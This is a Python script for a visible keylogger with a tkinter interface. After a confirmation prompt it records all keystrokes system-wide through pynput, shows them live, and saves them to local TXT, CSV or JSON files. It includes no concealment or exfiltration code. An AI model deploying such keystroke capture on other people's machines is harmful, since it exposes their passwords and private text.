import os
import datetime
import tkinter as tk
from tkinter import messagebox, filedialog
from pynput import keyboard
import threading
import json
import csv

# Global variables
log_data = []  # Stores log entries
log_window = None
log_text = None
keystroke_count_label = None  # Label for displaying keystroke count

def get_log_filename(extension="txt"):
    """Generates a unique log file name based on the current date and time."""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    return f"keylogged_at_{timestamp}.{extension}"

def start_keylogger():
    """Starts keylogging and opens the log display window."""
    response = messagebox.askyesno("Confirmation", "Do you want to start keylogging?")
    
    if response:
        messagebox.showinfo("Keylogger", "Keylogging started!\nPress 'Esc' to stop.")
        open_log_window()
        
        # Start keylogger in a separate thread
        keylogger_thread = threading.Thread(target=run_keylogger, daemon=True)
        keylogger_thread.start()
    else:
        messagebox.showinfo("Keylogger", "Keylogging aborted.")
        root.destroy()  # Close the GUI

def run_keylogger():
    """Runs the keylogger in a separate thread."""
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def on_press(key):
    """Handles key press events and logs them with a timestamp."""
    global log_data
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if hasattr(key, 'char') and key.char:
            log_entry = f"{timestamp} - {key.char}"
        else:
            log_entry = f"{timestamp} - [{key}]"

        log_data.append(log_entry)
        update_log_display()
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    """Stops logging when the Escape key is pressed."""
    if key == keyboard.Key.esc:
        messagebox.showinfo("Keylogger", "Keylogging stopped.")
        return False  # Stops the key listener

def update_log_display():
    """Updates the real-time log display window."""
    if log_text:
        log_text.config(state=tk.NORMAL)
        log_text.delete(1.0, tk.END)
        log_text.insert(tk.END, "\n".join(log_data))  # Display each key on a new line
        log_text.config(state=tk.DISABLED)
        log_text.yview(tk.END)  # Auto-scroll to the latest entry
    
    # Update keystroke count label
    if keystroke_count_label:
        keystroke_count_label.config(text=f"Keystrokes Logged: {len(log_data)}")

def open_log_window():
    """Creates a new window to display logs in real-time and provide save options."""
    global log_window, log_text, keystroke_count_label
    log_window = tk.Toplevel(root)
    log_window.title("Real-Time Keylogger Logs")
    log_window.geometry("600x500")  # Increased size for better visibility

    # Keystroke count label
    keystroke_count_label = tk.Label(log_window, text="Keystrokes Logged: 0", font=("Arial", 12, "bold"))
    keystroke_count_label.pack(pady=5)

    log_text = tk.Text(log_window, wrap="word", state=tk.DISABLED, font=("Arial", 10))
    log_text.pack(expand=True, fill="both", padx=10, pady=5)

    # Button Frame
    button_frame = tk.Frame(log_window)
    button_frame.pack(fill="x", pady=10)

    save_txt_button = tk.Button(button_frame, text="Save as .TXT", command=lambda: save_logs("txt"), font=("Arial", 10))
    save_txt_button.pack(side="left", expand=True, fill="x", padx=10, pady=5)

    save_csv_button = tk.Button(button_frame, text="Save as .CSV", command=lambda: save_logs("csv"), font=("Arial", 10))
    save_csv_button.pack(side="left", expand=True, fill="x", padx=10, pady=5)

    save_json_button = tk.Button(button_frame, text="Save as .JSON", command=lambda: save_logs("json"), font=("Arial", 10))
    save_json_button.pack(side="left", expand=True, fill="x", padx=10, pady=5)

def save_logs(file_type):
    """Saves logs in the selected format."""
    file_path = get_log_filename(file_type)

    if file_type == "txt":
        with open(file_path, "w") as f:
            f.write("\n".join(log_data))
    elif file_type == "csv":
        with open(file_path, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["Timestamp", "Keystroke"])
            for entry in log_data:
                writer.writerow(entry.split(" - "))  # Splitting timestamp and key
    elif file_type == "json":
        with open(file_path, "w") as f:
            json.dump({"keystrokes": log_data}, f, indent=4)

    messagebox.showinfo("Keylogger", f"Logs saved as {file_path}")

# Create GUI
root = tk.Tk()
root.title("Keylogger")
root.geometry("300x150")
root.resizable(False, False)

label = tk.Label(root, text="Start Keylogger?", font=("Arial", 12))
label.pack(pady=10)

start_button = tk.Button(root, text="Start", command=start_keylogger, font=("Arial", 10))
start_button.pack(pady=5)

exit_button = tk.Button(root, text="Exit", command=root.quit, font=("Arial", 10))
exit_button.pack(pady=5)

root.mainloop()